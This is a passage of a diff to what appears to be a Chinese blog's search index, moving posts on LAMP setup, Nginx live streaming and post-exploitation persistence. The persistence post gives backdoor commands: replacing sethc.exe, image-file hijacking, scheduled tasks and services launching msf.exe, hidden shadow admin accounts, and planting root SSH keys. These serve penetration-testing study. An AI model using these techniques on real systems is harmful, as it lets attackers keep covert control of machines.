-<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>
+<p>修改root /var/www/html即可改变默认路径</p>
+<p><a href="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png"><img src="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png" class="lozad post-image"></a></p>
+<h1 id="Nginx搭建直播推流平台"><a href="#Nginx搭建直播推流平台" class="headerlink" title="Nginx搭建直播推流平台"></a>Nginx搭建直播推流平台</h1><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>nginx-http-flv-module-master.zip + OBS Studio（pc端）/杏林推流（app端）</p>
+<h2 id="1、源码安装，配置"><a href="#1、源码安装，配置" class="headerlink" title="1、源码安装，配置"></a>1、源码安装，配置</h2><p>在nginx源码编译基础上，增加–add-module=/home/chen/software/nginx-http-flv-module-master（导入为绝对路径），即：</p>
+<pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module --add-module=/home/chen/software/nginx-http-flv-module-master</span><br></pre>
 
-<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
-<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>
+<h2 id="2、make、make-install"><a href="#2、make、make-install" class="headerlink" title="2、make、make install"></a>2、make、make install</h2><h2 id="3、修改配置文件"><a href="#3、修改配置文件" class="headerlink" title="3、修改配置文件"></a>3、修改配置文件</h2><p>（/etc/nginx/nginx.conf）</p>
+<p>在http中新增（与最内层函数同级）</p>
+<pre class="highlight"><span class="line">location /live &#123;</span><br><span class="line"></span><br><span class="line">  flv_live on;</span><br><span class="line"></span><br><span class="line">  chunked_transfer_encoding on;</span><br><span class="line"></span><br><span class="line">  add_header Access-Control-Allow-Origin *;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
 
-<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
-<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>
+<p>在文件末尾新增（与http函数同级）</p>
+<pre class="highlight"><span class="line">rtmp &#123;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line"></span><br><span class="line">		listen 1935;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">		application chen &#123;</span><br><span class="line"></span><br><span class="line">			live on;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
 
-<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br></pre>
+<p>（注！live不可更改，会导致无法加载视频）</p>
+<h2 id="4、检查"><a href="#4、检查" class="headerlink" title="4、检查"></a>4、检查</h2><pre class="highlight"><span class="line">nginx -t		# 检测配置文件有无语法错误</span><br><span class="line">nginx -s reload	# 重新加载</span><br></pre>
 
-<p>（注意！wp-config.php 删除可重装wp网站）</p>
-<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>
+<h2 id="5、推流设置"><a href="#5、推流设置" class="headerlink" title="5、推流设置"></a>5、推流设置</h2><p>OBS推流设置（PC）</p>
+<table>
+<thead>
+<tr>
+<th align="left">说明</th>
+<th align="left">命令</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">服务器</td>
+<td align="left">rtmp://139.224.x.x/live/</td>
+</tr>
+<tr>
+<td align="left">串流密钥</td>
+<td align="left">chen（可更改，类似于密码）</td>
+</tr>
+</tbody></table>
+<p>杏林推流设置（APP）</p>
+<pre class="highlight"><span class="line">rtmp://139.224.x.x/live/chen</span><br></pre>
 
-<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
-<p> <img src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" alt="image-20210809142444807" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" class="lozad post-image"></p>
+<h2 id="6、观看"><a href="#6、观看" class="headerlink" title="6、观看"></a>6、观看</h2><pre class="highlight"><span class="line">http://bilibili.github.io/flv.js/demo/			#观看视频地址</span><br><span class="line">http://139.224.x.x/live?app=live&amp;stream=chen	#推流视频链接</span><br></pre>
 ]]></content>
       <categories>
         <category>环境搭建</category>
       </categories>
       <tags>
-        <tag>Apache</tag>
+        <tag>Nginx</tag>
+        <tag>直播推流</tag>
       </tags>
   </entry>
   <entry>
@@ -7522,6 +7547,50 @@
       </tags>
   </entry>
   <entry>
+    <title>搭建LAMP环境</title>
+    <url>/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/</url>
+    <content><![CDATA[<h1 id="LAMP："><a href="#LAMP：" class="headerlink" title="LAMP："></a>LAMP：</h1><p>Linux+Apache+Mysql+PHP</p>
+<h1 id="1、安装Apache（httpd）"><a href="#1、安装Apache（httpd）" class="headerlink" title="1、安装Apache（httpd）"></a>1、安装Apache（httpd）</h1><pre class="highlight"><span class="line">yum install httpd httpd-devel httpd-manual httpd-tools</span><br></pre>
+
+<h1 id="2、启动apache并设置开机自启"><a href="#2、启动apache并设置开机自启" class="headerlink" title="2、启动apache并设置开机自启"></a>2、启动apache并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start httpd		#开启apache</span><br><span class="line"></span><br><span class="line">systemctl enable httpd		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status httpd		#查看apache状态</span><br></pre>
+
+<h1 id="3、安装Mysql"><a href="#3、安装Mysql" class="headerlink" title="3、安装Mysql"></a>3、安装Mysql</h1><pre class="highlight"><span class="line">yum install mariadb-server</span><br></pre>
+
+<h1 id="4、启动Mysql并设置开机自启"><a href="#4、启动Mysql并设置开机自启" class="headerlink" title="4、启动Mysql并设置开机自启"></a>4、启动Mysql并设置开机自启</h1><pre class="highlight"><span class="line">systemctl start mariadb			#开启mariadb</span><br><span class="line"></span><br><span class="line">systemctl enable mariadb		#设置开机自启</span><br><span class="line"></span><br><span class="line">systemctl status mariadb		#查看mariadb状态</span><br></pre>
+
+<h1 id="5、配置Mysql数据库"><a href="#5、配置Mysql数据库" class="headerlink" title="5、配置Mysql数据库"></a>5、配置Mysql数据库</h1><pre class="highlight"><span class="line">mysql_secure_installation		#初始化mysql数据库（全部回车确认）</span><br></pre>
+
+<p>设置mysql密码（非操作系统密码）</p>
+<h1 id="6、安装PHP"><a href="#6、安装PHP" class="headerlink" title="6、安装PHP"></a>6、安装PHP</h1><p>(php-fpm php-mysqlnd不装，其他均可)</p>
+<pre class="highlight"><span class="line">yum install php php-common php-cli php-devel php-gd php-ldap php-mbstring php-mysql php-pdo php-pear php-xml php-pgsql php-process php-snmp php-soap</span><br></pre>
+
+<h1 id="7、重启apache使php生效"><a href="#7、重启apache使php生效" class="headerlink" title="7、重启apache使php生效"></a>7、重启apache使php生效</h1><p>（php不是独立软件，依附apache）</p>
+<pre class="highlight"><span class="line">systemctl restart httpd</span><br></pre>
+
+<h1 id="8、解压WP网站"><a href="#8、解压WP网站" class="headerlink" title="8、解压WP网站"></a>8、解压WP网站</h1><h1 id="9、复制WP网站文件至Apache网站目录"><a href="#9、复制WP网站文件至Apache网站目录" class="headerlink" title="9、复制WP网站文件至Apache网站目录"></a>9、复制WP网站文件至Apache网站目录</h1><pre class="highlight"><span class="line">cp -r WP/* /var/www/html</span><br></pre>
+
+<h1 id="10、赋予Apache网站apache权限"><a href="#10、赋予Apache网站apache权限" class="headerlink" title="10、赋予Apache网站apache权限"></a>10、赋予Apache网站apache权限</h1><p>（apache服务由apache账户运行，还权限，安全控制）</p>
+<pre class="highlight"><span class="line">chown -R apache:apache /var/www/html</span><br></pre>
+
+<h1 id="11、禁用SELinux"><a href="#11、禁用SELinux" class="headerlink" title="11、禁用SELinux"></a>11、禁用SELinux</h1><p>（安全访问控制，影响网站访问）</p>
+<pre class="highlight"><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"></span><br><span class="line">修改SELINUX=disabled</span><br><span class="line">重启操作系统（reboot）</span><br></pre>
+
+<h1 id="12、访问网站ip-80端口，安装wp网站"><a href="#12、访问网站ip-80端口，安装wp网站" class="headerlink" title="12、访问网站ip+80端口，安装wp网站"></a>12、访问网站ip+80端口，安装wp网站</h1><h1 id="13、此时需要设置mysql账户"><a href="#13、此时需要设置mysql账户" class="headerlink" title="13、此时需要设置mysql账户"></a>13、此时需要设置mysql账户</h1><pre class="highlight"><span class="line">mysql -uroot -p			# 启动mysql（需要输入mysql密码）</span><br><span class="line">create database wp_web;	# 创建mysql账户</span><br><span class="line">exit					# 退出mysql</span><br></pre>
+
+<p>（注意！wp-config.php 删除可重装wp网站）</p>
+<h1 id="14、其他"><a href="#14、其他" class="headerlink" title="14、其他"></a>14、其他</h1><pre class="highlight"><span class="line">/var/www/html					# Apache默认网站路径</span><br><span class="line">/etc/httpd/conf/httpd.conf		# Apache配置文件路径</span><br></pre>
+
+<p>修改DocumentRoot “/var/www”即可修改网站路径</p>
+<p> <img src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" alt="image-20210809142444807" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="/article/%E6%90%AD%E5%BB%BALAMP%E7%8E%AF%E5%A2%83/image-20210809142444807.png" class="lozad post-image"></p>
+]]></content>
+      <categories>
+        <category>环境搭建</category>
+      </categories>
+      <tags>
+        <tag>Apache</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>搭建综合靶场</title>
     <url>/article/%E6%90%AD%E5%BB%BA%E7%BB%BC%E5%90%88%E9%9D%B6%E5%9C%BA/</url>
     <content><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>渗透学习中经常会用到到靶场，这里综合了几个常用的靶场，分享一下。</p>
@@ -7743,72 +7812,74 @@
       </tags>
   </entry>
   <entry>
-    <title>搭建Nginx+直播推流平台</title>
-    <url>/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/</url>
-    <content><![CDATA[<h1 id="搭建Nginx环境"><a href="#搭建Nginx环境" class="headerlink" title="搭建Nginx环境"></a>搭建Nginx环境</h1><h2 id="1、下载Nginx源码包"><a href="#1、下载Nginx源码包" class="headerlink" title="1、下载Nginx源码包"></a>1、下载Nginx源码包</h2><pre class="highlight"><span class="line">curl http://nginx.org/download/nginx-1.20.1.tar.gz -o nginx-1.20.1.tar.gz</span><br></pre>
-
-<h2 id="2、解压源码包"><a href="#2、解压源码包" class="headerlink" title="2、解压源码包"></a>2、解压源码包</h2><pre class="highlight"><span class="line">tar -zxvf nginx-1.20.1.tar.gz -C ../	# -C指定解压路径</span><br></pre>
-
-<h2 id="3、配置生成文件（一般修改配置文件、日志文件路径）"><a href="#3、配置生成文件（一般修改配置文件、日志文件路径）" class="headerlink" title="3、配置生成文件（一般修改配置文件、日志文件路径）"></a>3、配置生成文件（一般修改配置文件、日志文件路径）</h2><pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module</span><br></pre>
-
-<p>注：需要下载配置环境</p>
-<p>如：</p>
-<pre class="highlight"><span class="line">yum install pcre-devel zlib-devel openssl-devel</span><br></pre>
-
-<h2 id="4、make编译"><a href="#4、make编译" class="headerlink" title="4、make编译"></a>4、make编译</h2><h2 id="5、make-install安装"><a href="#5、make-install安装" class="headerlink" title="5、make install安装"></a>5、make install安装</h2><h2 id="6、添加nginx到环境变量"><a href="#6、添加nginx到环境变量" class="headerlink" title="6、添加nginx到环境变量"></a>6、添加nginx到环境变量</h2><pre class="highlight"><span class="line">ln -s /usr/local/nginx/sbin/nginx /usr/local/bin/</span><br></pre>
-
-<p>（注！ /usr/local/nginx/sbin/nginx为nginx启动文件的绝对路径）</p>
-<p>此时可直接使用nginx命令，如：nginx -s stop停止nginx服务</p>
-<h2 id="7、关闭防火墙"><a href="#7、关闭防火墙" class="headerlink" title="7、关闭防火墙"></a>7、关闭防火墙</h2><pre class="highlight"><span class="line">systemctl stop firewalld</span><br><span class="line"></span><br><span class="line">systemctl disable firewalld		#永久禁用</span><br></pre>
-
-<p>至此，访问80端口可看到Nginx测试页</p>
-<p>下载任意html静态网站压缩包，解压并复制到Nginx网站路径，即可访问静态网页</p>
-<h2 id="8、其他注意事项"><a href="#8、其他注意事项" class="headerlink" title="8、其他注意事项"></a>8、其他注意事项</h2><pre class="highlight"><span class="line">/var/lib/mysql				# mysql数据路径</span><br><span class="line">/usr/local/nginx/html		# Nginx默认网站路径</span><br><span class="line">/etc/nginx/nginx.conf		# Nginx配置文件</span><br></pre>
-
-<p>修改root /var/www/html即可改变默认路径</p>
-<p><a href="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png"><img src="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png" alt="1" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://www.zerochen.top/article/%E6%90%AD%E5%BB%BANginx-%E7%9B%B4%E6%92%AD%E6%8E%A8%E6%B5%81%E5%B9%B3%E5%8F%B0/1.png" class="lozad post-image"></a></p>
-<h1 id="Nginx搭建直播推流平台"><a href="#Nginx搭建直播推流平台" class="headerlink" title="Nginx搭建直播推流平台"></a>Nginx搭建直播推流平台</h1><h2 id="工具："><a href="#工具：" class="headerlink" title="工具："></a>工具：</h2><p>nginx-http-flv-module-master.zip + OBS Studio（pc端）/杏林推流（app端）</p>
-<h2 id="1、源码安装，配置"><a href="#1、源码安装，配置" class="headerlink" title="1、源码安装，配置"></a>1、源码安装，配置</h2><p>在nginx源码编译基础上，增加–add-module=/home/chen/software/nginx-http-flv-module-master（导入为绝对路径），即：</p>
-<pre class="highlight"><span class="line">./configure --conf-path=/etc/nginx/nginx.conf --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --pid-path=/var/lib/nginx/nginx.pid --with-http_v2_module --with-http_realip_module --with-http_flv_module --with-http_mp4_module --with-http_ssl_module --add-module=/home/chen/software/nginx-http-flv-module-master</span><br></pre>
-
-<h2 id="2、make、make-install"><a href="#2、make、make-install" class="headerlink" title="2、make、make install"></a>2、make、make install</h2><h2 id="3、修改配置文件"><a href="#3、修改配置文件" class="headerlink" title="3、修改配置文件"></a>3、修改配置文件</h2><p>（/etc/nginx/nginx.conf）</p>
-<p>在http中新增（与最内层函数同级）</p>
-<pre class="highlight"><span class="line">location /live &#123;</span><br><span class="line"></span><br><span class="line">  flv_live on;</span><br><span class="line"></span><br><span class="line">  chunked_transfer_encoding on;</span><br><span class="line"></span><br><span class="line">  add_header Access-Control-Allow-Origin *;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
-
-<p>在文件末尾新增（与http函数同级）</p>
-<pre class="highlight"><span class="line">rtmp &#123;</span><br><span class="line"></span><br><span class="line">	server &#123;</span><br><span class="line"></span><br><span class="line">		listen 1935;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">		application chen &#123;</span><br><span class="line"></span><br><span class="line">			live on;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre>
-
-<p>（注！live不可更改，会导致无法加载视频）</p>
-<h2 id="4、检查"><a href="#4、检查" class="headerlink" title="4、检查"></a>4、检查</h2><pre class="highlight"><span class="line">nginx -t		# 检测配置文件有无语法错误</span><br><span class="line">nginx -s reload	# 重新加载</span><br></pre>
-
-<h2 id="5、推流设置"><a href="#5、推流设置" class="headerlink" title="5、推流设置"></a>5、推流设置</h2><p>OBS推流设置（PC）</p>
+    <title>权限维持</title>
+    <url>/article/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
+    <content><![CDATA[<p>Windows权限维持</p>
+<p>后门：绕过安全措施获取对程序或系统放弃那个文权限的方法，是一个留在目标主机上的软件，可以使攻击者随时与目标主机进行连接。</p>
+<p>常见后门：</p>
 <table>
 <thead>
 <tr>
-<th align="left">说明</th>
-<th align="left">命令</th>
+<th>分类</th>
+<th>说明</th>
 </tr>
 </thead>
 <tbody><tr>
-<td align="left">服务器</td>
-<td align="left">rtmp://139.224.x.x/live/</td>
+<td>shift后门</td>
+<td>连按5次shift键，会以system权限启动粘滞键  <br>粘滞键的位置：  C:\windows\system32\sethc.exe     <br><br>利用  <br>用  cmd.exe或远控木马替换 windows\system32 目录下的粘滞键sethc.exe  如果出现拒绝访问，则需要修改权限：<br>  <code>takeown /f c:\windows\system32\sethc.exe /a /r /d y   cacls  c:\windows\system32\*.* /T</code>      <br><br>防御：  <br>1、 禁用该  sethc.exe 功能 或者在 “控制面板”中关闭“连续按5次shift键时启用粘滞键选项”  <br>2、使用权限约束  sethc.exe，使任何人都不能访问它</td>
 </tr>
 <tr>
-<td align="left">串流密钥</td>
-<td align="left">chen（可更改，类似于密码）</td>
+<td>映像劫持</td>
+<td>在高版本的windows版本中替换的文件受到了系统的保护，所以需要进行  “映像劫持”     <br><br>利用：  <br>注册表位置：  <br>1、在注册表的 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows  NT\CurrentVersion\Image File Execution Option</code> 下添加一个项 sethc.exe  <br>2、在新建的项中添加debugger键，键值设置为恶意程序的路径  或cmd直接添加、双击导出文件运行。    <br><br>其他可以劫持的程序：  <br>设置中心：C:\Windows\System32\utilman.exe，<br>快捷键：Windows+U  <br>屏幕键盘：C:\Windows\System32\osk.exe  <br>放大镜：C:\Windows\System32\Magnify.exe  ，<br>快捷键：Windows+加减号</td>
+</tr>
+<tr>
+<td>计划任务</td>
+<td>windows7-：<br>at，打开一个后台进程  每天定时执行：  <br><code>at 24:00:00 /every:M,T,W,TH,F,S,SU  &quot;c:\\windwos\\system32\\atd.exe&quot;</code>  <br><br>windows8+：<br>schtasks，将定时的任务在前台执行  系统启动时运行  <br><code>schtasks /create /tn &quot;chrom&quot; /tr cmd.exe  /sc minute /mo 1</code>   每分钟执行一次cmd  <br><br>命令行乱码：  <br>chcp 936 GBK编码  <br>chcp 65001 utf编码</td>
+</tr>
+<tr>
+<td>开机启动</td>
+<td>注册表启动项  <br>1、 regedit打开注册表：<code>HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</code>  <br>2、 添加一个键值类型为REG_SZ  <br>3、 在数据中填写需要运行程序的路径  <br>4、cmd.exe  实现了开机后自启动     其他开机启动项（需要用户登录生效，退出则失效）  <br><code>C:\ProgramData\Microsoft\Windows\Start  Menu\Programs\StartUp</code>  <br><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup  </code></td>
+</tr>
+<tr>
+<td>注册服务</td>
+<td><code>sc create jihua binPath= &quot;c:\\msf.exe&quot; start= auto</code>(注意=后均有空格，不可删除)  <br>EasyServerce、nssm等工具，自动注册服务，且有守护进程</td>
+</tr>
+<tr>
+<td>影子账户</td>
+<td>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式找不到这个用户的信息。影子账户可以获得管理员的权限，且不容易被发现     <br><br>利用  <br>1、创建一个隐藏用户  添加的test$用户在net user命令下是看不到的，但是在管理界面下可以看到  <br>2、在注册表中打开  HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/ 选项，点击Names菜单，  可以看到计算机中所有的账户名称  <br>注意：如果进入SAM后无法再看到里面的子选项，需要给予administrators完权控制权限，并重新进入注册表  <br>3、将administrator用户对应的项中的F值复制到 test$ 对应项中的F值，然后保存  <br>4、将Names中的 test$ 和 对应的 Users 中的目录进行右键导出  <br>5、将创建的隐藏账号 test$ 删除  <br>6、双击刚才导出的两个注册表，影子账户就创建完成了  <br>7、查看影子账户是否创建成功，只有在注册表中才能查看该账户</td>
 </tr>
 </tbody></table>
-<p>杏林推流设置（APP）</p>
-<pre class="highlight"><span class="line">rtmp://139.224.x.x/live/chen</span><br></pre>
-
-<h2 id="6、观看"><a href="#6、观看" class="headerlink" title="6、观看"></a>6、观看</h2><pre class="highlight"><span class="line">http://bilibili.github.io/flv.js/demo/			#观看视频地址</span><br><span class="line">http://139.224.x.x/live?app=live&amp;stream=chen	#推流视频链接</span><br></pre>
+<p>Linux权限维持</p>
+<table>
+<thead>
+<tr>
+<th>方法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>计划任务</td>
+<td>crontab -e 写入定时任务  *  * */1 * * /bin/msf</td>
+</tr>
+<tr>
+<td>开机启动项</td>
+<td>centos中  /etc/rc.local为开机启动项  将程序放置此文件夹即可     <br>/etc/profile为用户启动文件夹</td>
+</tr>
+<tr>
+<td>ssh公钥</td>
+<td>将公钥写入/root/.ssh/authorized_keys</td>
+</tr>
+<tr>
+<td>第三方守护进程</td>
+<td>yum  install supervisor</td>
+</tr>
+</tbody></table>
 ]]></content>
       <categories>
-        <category>环境搭建</category>
+        <category>内网渗透</category>
       </categories>
       <tags>
-        <tag>Nginx</tag>
-        <tag>直播推流</tag>
+        <tag>权限维持</tag>
       </tags>
   </entry>
   <entry>
@@ -8236,77 +8307,6 @@
       </categories>
       <tags>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>权限维持</title>
-    <url>/article/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
-    <content><![CDATA[<p>Windows权限维持</p>
-<p>后门：绕过安全措施获取对程序或系统放弃那个文权限的方法，是一个留在目标主机上的软件，可以使攻击者随时与目标主机进行连接。</p>
-<p>常见后门：</p>
-<table>
-<thead>
-<tr>
-<th>分类</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>shift后门</td>
-<td>连按5次shift键，会以system权限启动粘滞键  <br>粘滞键的位置：  C:\windows\system32\sethc.exe     <br><br>利用  <br>用  cmd.exe或远控木马替换 windows\system32 目录下的粘滞键sethc.exe  如果出现拒绝访问，则需要修改权限：<br>  <code>takeown /f c:\windows\system32\sethc.exe /a /r /d y   cacls  c:\windows\system32\*.* /T</code>      <br><br>防御：  <br>1、 禁用该  sethc.exe 功能 或者在 “控制面板”中关闭“连续按5次shift键时启用粘滞键选项”  <br>2、使用权限约束  sethc.exe，使任何人都不能访问它</td>
-</tr>
-<tr>
-<td>映像劫持</td>
-<td>在高版本的windows版本中替换的文件受到了系统的保护，所以需要进行  “映像劫持”     <br><br>利用：  <br>注册表位置：  <br>1、在注册表的 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows  NT\CurrentVersion\Image File Execution Option</code> 下添加一个项 sethc.exe  <br>2、在新建的项中添加debugger键，键值设置为恶意程序的路径  或cmd直接添加、双击导出文件运行。    <br><br>其他可以劫持的程序：  <br>设置中心：C:\Windows\System32\utilman.exe，<br>快捷键：Windows+U  <br>屏幕键盘：C:\Windows\System32\osk.exe  <br>放大镜：C:\Windows\System32\Magnify.exe  ，<br>快捷键：Windows+加减号</td>
-</tr>
-<tr>
-<td>计划任务</td>
-<td>windows7-：<br>at，打开一个后台进程  每天定时执行：  <br><code>at 24:00:00 /every:M,T,W,TH,F,S,SU  &quot;c:\\windwos\\system32\\atd.exe&quot;</code>  <br><br>windows8+：<br>schtasks，将定时的任务在前台执行  系统启动时运行  <br><code>schtasks /create /tn &quot;chrom&quot; /tr cmd.exe  /sc minute /mo 1</code>   每分钟执行一次cmd  <br><br>命令行乱码：  <br>chcp 936 GBK编码  <br>chcp 65001 utf编码</td>
-</tr>
-<tr>
-<td>开机启动</td>
-<td>注册表启动项  <br>1、 regedit打开注册表：<code>HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Run</code>  <br>2、 添加一个键值类型为REG_SZ  <br>3、 在数据中填写需要运行程序的路径  <br>4、cmd.exe  实现了开机后自启动     其他开机启动项（需要用户登录生效，退出则失效）  <br><code>C:\ProgramData\Microsoft\Windows\Start  Menu\Programs\StartUp</code>  <br><code>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup  </code></td>
-</tr>
-<tr>
-<td>注册服务</td>
-<td><code>sc create jihua binPath= &quot;c:\\msf.exe&quot; start= auto</code>(注意=后均有空格，不可删除)  <br>EasyServerce、nssm等工具，自动注册服务，且有守护进程</td>
-</tr>
-<tr>
-<td>影子账户</td>
-<td>影子用户顾名思义就是一个隐藏用户，只能通过注册表查看这个用户，其它方式找不到这个用户的信息。影子账户可以获得管理员的权限，且不容易被发现     <br><br>利用  <br>1、创建一个隐藏用户  添加的test$用户在net user命令下是看不到的，但是在管理界面下可以看到  <br>2、在注册表中打开  HKEY_LOCAL_MACHINE/SAM/SAM/Domains/Account/Users/ 选项，点击Names菜单，  可以看到计算机中所有的账户名称  <br>注意：如果进入SAM后无法再看到里面的子选项，需要给予administrators完权控制权限，并重新进入注册表  <br>3、将administrator用户对应的项中的F值复制到 test$ 对应项中的F值，然后保存  <br>4、将Names中的 test$ 和 对应的 Users 中的目录进行右键导出  <br>5、将创建的隐藏账号 test$ 删除  <br>6、双击刚才导出的两个注册表，影子账户就创建完成了  <br>7、查看影子账户是否创建成功，只有在注册表中才能查看该账户</td>
-</tr>
-</tbody></table>
-<p>Linux权限维持</p>
-<table>
-<thead>
-<tr>
-<th>方法</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>计划任务</td>
-<td>crontab -e 写入定时任务  *  * */1 * * /bin/msf</td>
-</tr>
-<tr>
-<td>开机启动项</td>
-<td>centos中  /etc/rc.local为开机启动项  将程序放置此文件夹即可     <br>/etc/profile为用户启动文件夹</td>
-</tr>
-<tr>
-<td>ssh公钥</td>
-<td>将公钥写入/root/.ssh/authorized_keys</td>
-</tr>
-<tr>
-<td>第三方守护进程</td>
-<td>yum  install supervisor</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>权限维持</tag>
       </tags>
   </entry>
   <entry>
